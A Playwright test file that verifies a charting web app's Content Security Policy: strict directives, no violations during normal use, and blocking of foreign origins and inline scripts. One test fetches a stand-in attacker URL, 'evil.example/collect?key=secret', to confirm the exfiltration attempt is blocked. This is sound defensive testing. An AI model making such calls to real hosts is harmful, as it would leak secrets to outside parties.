import { expect, test } from '@playwright/test';
import type { Page } from '@playwright/test';
test.use({ serviceWorkers: 'block' });

interface Violation {
  directive: string;
  blocked: string;
}
async function trackViolations(page: Page) {
  await page.addInitScript(() => {
    const store: { directive: string; blocked: string }[] = [];
    (window as unknown as { __csp: typeof store }).__csp = store;
    document.addEventListener('securitypolicyviolation', (event) =>
      store.push({
        directive: event.violatedDirective,
        blocked: event.blockedURI,
      }),
    );
  });
  return () =>
    page.evaluate(() =>
      (window as unknown as { __csp: Violation[] }).__csp.slice(),
    );
}

test('ships a strict policy with no unsafe directives or wildcard hosts', async ({
  page,
}) => {
  await page.goto('/');
  const policy = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute('content');
  expect(policy).toContain("script-src 'self'");
  expect(policy).toContain("object-src 'none'");
  expect(policy).toContain("base-uri 'self'");
  expect(policy).toContain('https://api.twelvedata.com');
  expect(policy).toContain('https://www.alphavantage.co');
  expect(policy).not.toMatch(/unsafe-|\*|http:/);
});

test('the real app runs without a single policy violation', async ({
  page,
}) => {
  const violations = await trackViolations(page);
  const errors: string[] = [];
  page.on('pageerror', (error) => errors.push(error.message));
  page.on('console', (message) => {
    if (/Content Security Policy|Refused to/i.test(message.text()))
      errors.push(message.text());
  });
  await page.goto('/');
  await page.getByRole('button', { name: /Try Demo/ }).click();
  await expect(
    page.getByTestId('price-chart').locator('canvas').first(),
  ).toBeVisible();
  // Every theme sets CSS variables and chart colors at runtime.
  await page.getByRole('button', { name: 'Theme', exact: true }).click();
  const themes = page.getByRole('radio');
  for (let index = 0; index < (await themes.count()); index++)
    await themes.nth(index).check();
  await page.keyboard.press('Escape');
  for (const interval of ['Weekly', 'Monthly', 'Daily'])
    await page.getByRole('button', { name: `${interval} interval` }).click();
  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Download CSV' }).click();
  expect((await download).suggestedFilename()).toMatch(/\.csv$/);
  expect(await violations()).toEqual([]);
  expect(errors).toEqual([]);
});

test('allows the provider hosts and blocks every other origin and inline script', async ({
  page,
}) => {
  const violations = await trackViolations(page);
  await page.route('https://api.twelvedata.com/**', (route) =>
    route.fulfill({ status: 401, json: { code: 401 } }),
  );
  await page.goto('/');
  const outcome = await page.evaluate(async () => {
    const reach = (url: string) =>
      fetch(url, { mode: 'no-cors' }).then(
        () => 'allowed',
        () => 'blocked',
      );
    const inline = document.createElement('script');
    inline.textContent = 'window.__inlineRan = true';
    document.head.append(inline);
    return {
      provider: await reach('https://api.twelvedata.com/time_series'),
      other: await reach('https://evil.example/collect?key=secret'),
      inlineRan: Boolean(
        (window as unknown as { __inlineRan?: boolean }).__inlineRan,
      ),
    };
  });
  expect(outcome).toEqual({
    provider: 'allowed',
    other: 'blocked',
    inlineRan: false,
  });
  const seen = await violations();
  expect(seen.map((item) => item.directive)).toEqual(
    expect.arrayContaining(['connect-src', 'script-src-elem']),
  );
  expect(seen.some((item) => item.blocked.includes('twelvedata'))).toBe(false);
});
